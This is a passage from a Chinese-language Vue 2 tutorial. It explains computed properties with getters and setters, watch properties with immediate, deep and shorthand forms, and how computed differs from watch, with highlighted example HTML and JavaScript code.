class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>事件的基本使用<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 引入Vue --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>        姓：<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;firstName&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>        名：<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;lastName&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>        测试：<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;x&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span>// 这里修改 不会调 fullName的get方法<br>        全名：<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>&#123;&#123;fullName&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>        全名：<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>&#123;&#123;fullName&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>        <span class="hljs-comment">&lt;!-- 全名：&lt;span&gt;&#123;&#123;fullName&#125;&#125;&lt;/span&gt; &lt;br/&gt; --&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>      <br>      <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">          <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">          <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-attr">firstName</span>:<span class="hljs-string">&#x27;张&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">lastName</span>:<span class="hljs-string">&#x27;三&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">x</span>:<span class="hljs-string">&#x27;你好&#x27;</span></span><br><span class="language-javascript">          &#125;,</span><br><span class="language-javascript">          <span class="hljs-attr">computed</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-comment">// 完整写法</span></span><br><span class="language-javascript">            <span class="hljs-attr">fullName</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">get</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;get被调用了&#x27;</span>)</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">firstName</span> + <span class="hljs-string">&#x27;-&#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">lastName</span></span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-title function_">set</span>(<span class="hljs-params">value</span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;set&#x27;</span>, value)</span><br><span class="language-javascript">            <span class="hljs-keyword">const</span> arr = value.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;-&#x27;</span>)</span><br><span class="language-javascript">            <span class="hljs-variable language_">this</span>.<span class="hljs-property">firstName</span> = arr[<span class="hljs-number">0</span>]</span><br><span class="language-javascript">            <span class="hljs-variable language_">this</span>.<span class="hljs-property">lastName</span> = arr[<span class="hljs-number">1</span>]</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">      </span><br><span class="language-javascript">            <span class="hljs-comment">// 简写</span></span><br><span class="language-javascript">            <span class="hljs-comment">/* fullName() &#123;</span></span><br><span class="hljs-comment"><span class="language-javascript">              console.log(&#x27;get被调用了&#x27;)</span></span><br><span class="hljs-comment"><span class="language-javascript">              return this.firstName + &#x27;-&#x27; + this.lastName</span></span><br><span class="hljs-comment"><span class="language-javascript">            &#125; */</span></span><br><span class="language-javascript">          &#125;</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">      </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124111838464.png" alt="image-20221124111838464"></p><h2 id="1-10-监视属性"><a href="#1-10-监视属性" class="headerlink" title="1.10 监视属性"></a>1.10 监视属性</h2><p>监视属性watch：</p><ul><li>当被监视的属性变化时, 回调函数自动调用, 进行相关操作</li><li>监视的属性必须存在，才能进行监视</li><li>配置项属性immediate:false，改为 true，则初始化时调用一次 handler(newValue,oldValue)</li><li>监视的两种写法：<ul><li>(1).new Vue时传入watch配置</li><li>(2).通过vm.$watch监视</li></ul></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>天气案例_监视属性<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>今天天气很&#123;&#123;info&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;changeWeather&quot;</span>&gt;</span>切换天气<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript">  <span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">    <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-attr">isHot</span>: <span class="hljs-literal">true</span>,</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-attr">computed</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-title function_">info</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">isHot</span> ? <span class="hljs-string">&#x27;炎热&#x27;</span> : <span class="hljs-string">&#x27;凉爽&#x27;</span></span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-title function_">changeWeather</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-property">isHot</span> = !<span class="hljs-variable language_">this</span>.<span class="hljs-property">isHot</span></span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-comment">// 方式一</span></span><br><span class="language-javascript">    <span class="hljs-comment">/* watch:&#123;</span></span><br><span class="hljs-comment"><span class="language-javascript">isHot:&#123;</span></span><br><span class="hljs-comment"><span class="language-javascript">immediate:true,</span></span><br><span class="hljs-comment"><span class="language-javascript">handler(newValue,oldValue)&#123;</span></span><br><span class="hljs-comment"><span class="language-javascript">console.log(&#x27;isHot被修改了&#x27;,newValue,oldValue)</span></span><br><span class="hljs-comment"><span class="language-javascript">&#125;</span></span><br><span class="hljs-comment"><span class="language-javascript">&#125;</span></span><br><span class="hljs-comment"><span class="language-javascript">&#125; */</span></span><br><span class="language-javascript">  &#125;)</span><br><span class="language-javascript">  <span class="hljs-comment">// 方式二</span></span><br><span class="language-javascript">  vm.$watch(<span class="hljs-string">&#x27;isHot&#x27;</span>, &#123;</span><br><span class="language-javascript">    <span class="hljs-attr">immediate</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// 初始化时让handler调用一下</span></span><br><span class="language-javascript">    <span class="hljs-comment">//handler什么时候调用？当isHot发生改变时</span></span><br><span class="language-javascript">    <span class="hljs-title function_">handler</span>(<span class="hljs-params">newValue, oldValue</span>) &#123;</span><br><span class="language-javascript">      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;isHot被修改了&#x27;</span>, newValue, oldValue)</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">  &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>​      </p><p><strong>深度监视 ：</strong></p><ul><li>(1).Vue中的watch默认不监测对象内部值的改变（一层）</li><li>(2).配置deep:true可以监测对象内部值改变（多层）</li></ul><blockquote><p>备注：</p><p>(1).Vue自身可以监测&#x3D;&#x3D;对象内部值&#x3D;&#x3D;的改变，但Vue提供的watch默认不可以（执行效率高）</p><p>(2).使用watch时根据数据的具体结构，决定是否采用深度监视</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;&#123; numbers &#125;&#125; <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>a的值是:&#123;&#123; numbers.a &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;numbers.a++&quot;</span>&gt;</span>点我让a+1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>b的值是:&#123;&#123; numbers.b &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;numbers.b++&quot;</span>&gt;</span>点我让b+1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>e的值是:&#123;&#123; numbers.c.d.e &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;numbers.c.d.e++&quot;</span>&gt;</span>点我让e+1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;(value,index) of numbers.f&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;index&quot;</span> &gt;</span>&#123;&#123; value.a &#125;&#125; <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span>点我让f[0]+1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;numbers = &#123;a:666,b:888&#125;&quot;</span>&gt;</span>彻底替换掉numbers<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    &#123;&#123;numbers.c.d.e&#125;&#125;<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">      <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">      <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">isHot</span>: <span class="hljs-literal">true</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">numbers</span>: &#123;</span><br><span class="language-javascript">          <span class="hljs-attr">a</span>: <span class="hljs-number">1</span>,</span><br><span class="language-javascript">          <span class="hljs-attr">b</span>: <span class="hljs-number">1</span>,</span><br><span class="language-javascript">          <span class="hljs-attr">c</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-attr">d</span>: &#123;</span><br><span class="language-javascript">              <span class="hljs-attr">e</span>: <span class="hljs-number">100</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">          &#125;,</span><br><span class="language-javascript">          <span class="hljs-comment">// f:[0,1,2]</span></span><br><span class="language-javascript">          <span class="hljs-attr">f</span>: [&#123; <span class="hljs-attr">a</span>: <span class="hljs-number">1</span> &#125;, &#123; <span class="hljs-attr">a</span>: <span class="hljs-number">2</span> &#125;]</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">      <span class="hljs-attr">watch</span>: &#123;</span><br><span class="language-javascript">        <span class="hljs-comment">// 监视多级结构中某个属性的变化</span></span><br><span class="language-javascript">        <span class="hljs-string">&#x27;numbers.a&#x27;</span>: &#123;</span><br><span class="language-javascript">          <span class="hljs-title function_">handler</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;a被改变了&#x27;</span>)</span><br><span class="language-javascript">          &#125;</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-comment">// 监视多级结构中所有属性的变化</span></span><br><span class="language-javascript">        <span class="hljs-attr">numbers</span>: &#123;</span><br><span class="language-javascript">          <span class="hljs-attr">deep</span>: <span class="hljs-literal">true</span>,</span><br><span class="language-javascript">          <span class="hljs-title function_">handler</span>(<span class="hljs-params">newValue, oldValue</span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(newValue)</span><br><span class="language-javascript">            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;numbers改变了&#x27;</span>)</span><br><span class="language-javascript">            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(oldValue)</span><br><span class="language-javascript">          &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">      <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">        <span class="hljs-title function_">add</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">          <span class="hljs-variable language_">this</span>.<span class="hljs-property">numbers</span>.<span class="hljs-property">f</span>[<span class="hljs-number">0</span>].<span class="hljs-property">a</span>++</span><br><span class="language-javascript">          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">numbers</span>.<span class="hljs-property">f</span>)</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript">  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>&#39;numbers.a&#39;</code>监听对象内部值 转为字符串 <code>numbers</code>是简写方式</p><blockquote><p>监视属性简写</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 准备好一个容器--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>今天天气很&#123;&#123;info&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;changeWeather&quot;</span>&gt;</span>切换天气<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">isHot</span>:<span class="hljs-literal">true</span>,</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">computed</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">info</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">isHot</span> ? <span class="hljs-string">&#x27;炎热&#x27;</span> : <span class="hljs-string">&#x27;凉爽&#x27;</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">changeWeather</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-variable language_">this</span>.<span class="hljs-property">isHot</span> = !<span class="hljs-variable language_">this</span>.<span class="hljs-property">isHot</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">watch</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-comment">//简写</span></span><br><span class="language-javascript">            <span class="hljs-title function_">isHot</span>(<span class="hljs-params">newValue, oldValue</span>) &#123;</span><br><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;isHot被修改了&#x27;</span>, newValue, oldValue, <span class="hljs-variable language_">this</span>)</span><br><span class="language-javascript">&#125; </span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>computed和watch之间的区别 ：</strong></p><ul><li>computed能完成的功能，watch都可以完成</li><li>watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作</li></ul><blockquote><p>两个重要的小原则：</p><p>1.所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象</p><p>2.所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成箭头函数，这样this的指向才是vm 或组件实例对象</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 准备好一个容器--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>    姓：<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;firstName&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>    名：<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;lastName&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>    全名：<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>&#123;&#123;fullName&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">firstName</span>:<span class="hljs-string">&#x27;张&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">lastName</span>:<span class="hljs-string">&#x27;三&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">fullName</span>:<span class="hljs-string">&#x27;张-三&#x27;</span></span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">watch</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-comment">// watch 监视器里可以写 异步函数</span></span><br><span class="language-javascript">            <span class="hljs-title function_">firstName</span>(<span class="hljs-params">val</span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">()=&gt;</span>&#123;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span 